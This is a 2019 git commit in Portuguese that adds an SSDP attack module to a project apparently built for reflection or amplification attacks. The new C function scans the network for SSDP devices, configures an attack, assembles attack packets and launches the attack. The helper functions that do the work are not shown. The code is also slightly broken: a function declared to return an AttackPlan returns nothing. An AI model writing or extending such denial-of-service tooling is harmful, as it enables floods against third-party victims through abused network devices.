42ed8a680437d254ddcdb83a6545b0e2bea27131
EduardoSchuabb <eduardo.schuabb@gmail.com>
2019-02-02 17:04:23 -0200

    Atualizando projeto, colocando ataque SSDP

--- src/linderhof/hom/ssdp/src/manager.c
+++ src/linderhof/hom/ssdp/src/manager.c
@@ -1,5 +1,47 @@
 
+
+#include "ssdpLib.h"
+
+
+AttackPlan createAttackSSDP(LhfDraft *draft){
+    
+    AttackPlan *newData;
+    memalloc( (void *)&newData, sizeof( AttackPlan ) );
+
+
+    listDispositivoSSDP* listaDispositivos;
+	configuracaoAtaque* configuracao = NULL;
+	pacoteAtaque* pckAttack = NULL;
+
+    listaDispositivos = iniciaListDisp();
+
+    printf("Modulo de pesquisa SSDP. \n");
+	printf("------------------------------------------------\n");
+    pesquisarDispositivosSSDP(listaDispositivos);
+	printf("----------------------Fim Pesquisa-------------------\n");
+	//mostrarDispositivosObtidos(listaDispositivos);
+
+	/*----------------------------------------------------------------------*/
+	printf("Modulo de ataque SSDP. \n");
+
+	configuracao = configurarAttackSSDP(listaDispositivos);
+
+	pckAttack = montaPacketAttackSSDP(configuracao);
+
+	iniciaAtaqueSSDP(configuracao, pckAttack, 1);
+
+
+
+}
+
+
+// p_draft = argumentos que o ataque vai precisar.
 int  ExecuteSsdpMirror( void *p_draft )
 {
+    AttackPlan *plan;
+    LhfDraft *draft = (LhfDraft *)p_draft;
+
+    createAttackSSDP(draft);
+
     return 0;
 }
